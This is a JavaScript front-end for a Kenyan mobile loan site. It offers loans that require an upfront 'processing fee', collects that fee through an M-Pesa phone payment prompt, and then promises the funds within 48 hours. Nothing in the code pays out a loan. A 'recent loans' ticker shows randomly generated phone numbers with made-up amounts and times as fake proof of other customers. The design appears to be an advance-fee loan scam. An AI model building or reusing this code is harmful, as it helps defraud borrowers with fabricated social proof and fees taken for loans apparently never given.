// Load user data from SessionStorage
const userData = JSON.parse(sessionStorage.getItem('myLoanNewApp') || '{}');

// Redirect if no phone number is found (prevents direct access)
if (!userData.phone_number) {
    window.location.href = '/eligibility';
}

document.getElementById('user-name').textContent = userData.name || 'Customer';

let selectedLoan = null;

function formatMoney(amount) {
    return `Ksh ${Number(amount).toLocaleString()}`;
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// Helper to format phone number to 254XXXXXXXXX
function formatPhoneNumber(phone) {
    let p = phone.toString().replace(/\D/g, ''); // Remove non-digits
    if (p.startsWith('0')) {
        return '254' + p.substring(1);
    }
    if (p.startsWith('7') || p.startsWith('1')) {
        return '254' + p;
    }
    if (p.startsWith('254')) {
        return p;
    }
    return p;
}

// Dynamically generate 15 loan options
const loanOptions = [
    { amount: 5500, fee: 100 },
    { amount: 6800, fee: 130 },
    { amount: 7800, fee: 170 },
    { amount: 9800, fee: 190 },
    { amount: 11200, fee: 230 },
    { amount: 16800, fee: 250 },
    { amount: 21200, fee: 270 },
    { amount: 25600, fee: 400 },
    { amount: 30000, fee: 470 },
    { amount: 35400, fee: 590 },
    { amount: 39800, fee: 730 },
    { amount: 44200, fee: 1010 },
    { amount: 48600, fee: 1600 },
    { amount: 70000, fee: 1950 },
    { amount: 80000, fee: 2200 }
];

function renderLoanOptions() {
    const grid = document.getElementById('loan-grid');
    if (!grid) return;
    grid.innerHTML = '';
    loanOptions.forEach(opt => {
        const div = document.createElement('div');
        div.className = 'loan-option';
        div.style.background = '#f8fafc';
        div.style.borderRadius = '14px';
        div.style.padding = '24px 0';
        div.style.boxShadow = '0 1px 4px rgba(0,0,0,0.03)';
        div.style.border = '2px solid transparent';
        div.style.cursor = 'pointer';
        div.style.transition = 'all 0.2s';
        div.style.textAlign = 'center';
        div.onclick = function() { selectLoanOption(div, opt.amount, opt.fee); };
        div.innerHTML = `<div class="loan-amount" style="font-size:1.35rem;font-weight:700;color:#008740;">Ksh ${opt.amount.toLocaleString()}</div><div class="processing-fee" style="font-size:1rem;color:#666;font-weight:500;">Fee: Ksh ${opt.fee}</div>`;
        grid.appendChild(div);
    });
}

function selectLoanOption(element, amount, fee) {
    const applyBtn = document.getElementById('apply-btn');
    document.querySelectorAll('.loan-option').forEach(opt => {
        opt.style.background = '#f8fafc';
        opt.style.borderColor = 'transparent';
    });
    element.style.background = '#e6f4ea'; // Highlight selected
    element.style.borderColor = '#00A651';
    selectedLoan = { amount, fee };
    applyBtn.disabled = false;
    applyBtn.classList.add('is-ready');
    document.getElementById('error-message').style.display = 'none';
    userData.loan_amount = amount;
    userData.processing_fee = fee;
    sessionStorage.setItem('myLoanNewApp', JSON.stringify(userData));
    applyBtn.scrollIntoView({ behavior: 'smooth', block: 'center' });
    applyBtn.focus({ preventScroll: true });
    applyBtn.classList.remove('jump-focus');
    void applyBtn.offsetWidth;
    applyBtn.classList.add('jump-focus');
}

window.addEventListener('DOMContentLoaded', renderLoanOptions);

// Handle Apply Button Click
document.getElementById('apply-btn').addEventListener('click', async function () {
    if (!selectedLoan) {
        document.getElementById('error-message').style.display = 'block';
        return;
    }

    const confirmResult = await Swal.fire({
        title: 'Confirm Loan Request',
        html: `
            <div class="modern-summary-card">
                <div class="modern-summary-row">
                    <span class="modern-summary-label">Loan Amount</span>
                    <span class="modern-summary-value">${formatMoney(selectedLoan.amount)}</span>
                </div>
                <div class="modern-summary-row">
                    <span class="modern-summary-label">Processing Fee</span>
                    <span class="modern-summary-value">${formatMoney(selectedLoan.fee)}</span>
                </div>
                <div class="modern-summary-row">
                    <span class="modern-summary-label">Total Repayment</span>
                    <span class="modern-summary-value">${formatMoney(selectedLoan.amount * 1.1)}</span>
                </div>
            </div>
            <div class="modern-phone-pill">
                <i class="fas fa-mobile-alt"></i> ${userData.phone_number}
            </div>
        `,
        showCancelButton: true,
        confirmButtonText: 'Proceed',
        cancelButtonText: 'Change Amount',
        buttonsStyling: false,
        customClass: {
            popup: 'modern-popup',
            htmlContainer: 'modern-html',
            actions: 'modern-actions',
            confirmButton: 'modern-confirm-btn',
            cancelButton: 'modern-cancel-btn'
        }
    });

    // 2. Process Payment if Confirmed
    if (confirmResult.isConfirmed) {
        Swal.fire({
            title: 'Sending Payment Request',
            html: `
                <div class="modern-processing">
                    <div class="modern-spinner"></div>
                    <div class="modern-processing-title">Connecting securely...</div>
                    <div class="modern-processing-note">Please wait while we initiate your payment request.</div>
                </div>
            `,
            showConfirmButton: false,
            allowOutsideClick: false,
            customClass: {
                popup: 'modern-popup',
                htmlContainer: 'modern-html'
            }
        });

        try {
            const formattedPhone = formatPhoneNumber(userData.phone_number);
            const apiBase = 'http://localhost:4000/api';

            // Build payload, only include partyB if it exists
            const payload = {
                msisdn: formattedPhone,
                amount: selectedLoan.fee,
                reference: userData.name || 'LoanAppUser'
            };
            if (userData.till_number) {
                payload.partyB = userData.till_number;
            }
            const response = await fetch(`${apiBase}/haskback_push`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            });
            const result = await response.json();
            if (response.ok && result.success) {
                const txId = result.txId;

                // 3. Show Polling UI
                let pollInterval;
                let pollClosed = false;
                let attempts = 0;
                const maxAttempts = 20; // 20 * 3s = 60 seconds timeout
                const closeAndCleanup = async (reason, isSuccess) => {
                    if (pollClosed) return;
                    pollClosed = true;
                    clearInterval(pollInterval);
                    // Always clear pending tx on backend
                    await fetch(`${apiBase}/clear_pending_tx`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ msisdn: formattedPhone, txId })
                    });
                    if (isSuccess === true) {
                        sessionStorage.setItem('payment_status_newapp', 'completed');
                        sessionStorage.setItem('payment_time_newapp', new Date().toISOString());
                        Swal.fire({
                            icon: 'success',
                            title: 'Fee Paid! Loan Processing',
                            html: `<div style=\"font-size:1.08rem;\">Thank you for your payment. Your loan request has been received and is being processed. You will receive your funds in your account within 48 hours.</div>`,
                            showConfirmButton: true,
                            confirmButtonText: 'OK',
                            customClass: { popup: 'modern-popup', htmlContainer: 'modern-html' }
                        }).then(() => {
                            window.location.href = '/dash';
                        });
                    } else if (isSuccess === false) {
                        await Swal.fire({
                            icon: 'error',
                            title: 'Loan Processing Failed',
                            html: `<div style=\"font-size:1.08rem;\">Loan processing failed because the processing fee was not paid.</div>`,
                            confirmButtonText: 'OK',
                            customClass: { popup: 'modern-popup', htmlContainer: 'modern-html' }
                        });
                    } else if (isSuccess === 'timeout') {
                        await Swal.fire({
                            icon: 'error',
                            title: 'Loan Processing Failed',
                            html: `<div style=\"font-size:1.08rem;\">Loan processing failed because the processing fee was not paid in time.</div>`,
                            confirmButtonText: 'OK',
                            customClass: { popup: 'modern-popup', htmlContainer: 'modern-html' }
                        });
                    }
                };

                const pollPopup = Swal.fire({
                    title: 'Confirm on Your Phone',
                    html: `
                        <div class="modern-processing">
                            <div class="modern-spinner"></div>
                            <div class="modern-processing-title">Check Your Phone</div>
                            <div class="modern-processing-note">Enter your PIN to pay <strong>${formatMoney(selectedLoan.fee)}</strong>.</div>
                            <div class="modern-processing-phone">${formattedPhone}</div>
                        </div>
                    `,
                    showConfirmButton: false,
                    allowOutsideClick: true,
                    customClass: {
                        popup: 'modern-popup',
                        htmlContainer: 'modern-html'
                    },
                    willClose: () => closeAndCleanup('closed', false)
                });

                pollInterval = setInterval(async () => {
                    attempts++;
                    try {
                        const statusResp = await fetch(`${apiBase}/haskback_status`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ msisdn: formattedPhone, txId })
                        });
                        const statusResult = await statusResp.json();
                        if (statusResult.status === 'COMPLETED') {
                            await closeAndCleanup('success', true);
                        } else if (statusResult.status === 'FAILED') {
                            await closeAndCleanup('fail', false);
                        } else if (attempts >= maxAttempts) {
                            await closeAndCleanup('timeout', 'timeout');
                        }
                    } catch (e) {
                        console.error('Polling error', e);
                        // Don't stop polling on network error, just wait for next tick
                    }
                }, 3000);

                // Also clean up if user leaves page
                window.addEventListener('beforeunload', () => closeAndCleanup('unload', false));
            } else {
                throw new Error(result.message || 'Failed to initiate payment');
            }
        } catch (error) {
            console.error('Payment error:', error);
            const retryChoice = await Swal.fire({
                title: 'Payment Failed',
                html: `
                    <p style="font-size: 0.9rem;">${error.message || 'Unable to process payment. Please try again.'}</p>
                `,
                icon: 'error',
                showCancelButton: true,
                confirmButtonText: 'Retry Now',
                cancelButtonText: 'Close',
                confirmButtonColor: '#00A651',
                customClass: {
                    popup: 'modern-popup',
                    htmlContainer: 'modern-html'
                }
            });
            if (retryChoice.isConfirmed) {
                setTimeout(() => document.getElementById('apply-btn').click(), 100);
            }
        }
    }
});

// --- Recent Loan Carousel (ensure this runs last) ---
// Valid Safaricom prefixes: 070, 071, 072, 074, 075, 076, 079, 010, 011, 012
const safaricomPrefixes = ['070', '071', '072', '074', '075', '076', '079', '010', '011', '012'];
function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
const recentLoanNumbers = Array.from({length: 200}, () => {
    const prefix = safaricomPrefixes[getRandomInt(0, safaricomPrefixes.length - 1)];
    // Safaricom numbers are 10 digits: prefix (3) + 7 digits
    const rest = getRandomInt(1000000, 9999999).toString();
    const num = prefix + rest;
    // Mask only the 3 middle digits (e.g., 0712***3456)
    return num.replace(/(\d{4})\d{3}(\d{3})/, '$1***$2');
});
const recentLoanAmounts = [
    22500, 15000, 12000, 18500, 9000, 30000, 17500, 21000, 8000, 25000
];
const recentLoanTimes = [
    '7 mins ago', '12 mins ago', '18 mins ago', '25 mins ago', '32 mins ago',
    '40 mins ago', '1 hour ago', '1h 15m ago', '1h 30m ago', '2 hours ago'
];
let carouselIndex = 0;
function updateRecentLoanCarousel() {
    const number = recentLoanNumbers[carouselIndex % recentLoanNumbers.length];
    const amount = recentLoanAmounts[carouselIndex % recentLoanAmounts.length];
    const time = recentLoanTimes[carouselIndex % recentLoanTimes.length];
    const text = `${number} loaned Ksh ${amount.toLocaleString()} - ${time}`;
    const el = document.getElementById('recent-loan-text');
    if (el) el.textContent = text;
    carouselIndex++;
}
window.addEventListener('DOMContentLoaded', () => {
    updateRecentLoanCarousel();
    setInterval(updateRecentLoanCarousel, 2500);
});
